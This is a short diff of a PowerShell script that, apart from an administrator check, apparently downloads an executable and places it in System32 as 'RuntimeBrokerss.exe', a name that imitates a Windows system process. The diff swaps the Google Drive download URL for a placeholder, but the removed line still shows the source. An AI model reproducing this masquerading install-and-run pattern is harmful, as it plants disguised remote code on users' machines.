@@ -21,7 +21,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
-$exeUrl = "https://drive.usercontent.google.com/download?id=1rJQnGIRMRAvsD3I26xAZfM7_zSm-_70M&export=download&authuser=0&confirm=t&uuid=c7fcef78-16b4-46ed-8185-29e398b0d59a&at=ALWLOp4BU9tsYm5IsBFJsxNk_AFb%3A1764076160015"
+$exeUrl = "$$$$$$$$$$"
 
 # -----------------------------
 # Install & Run Mode
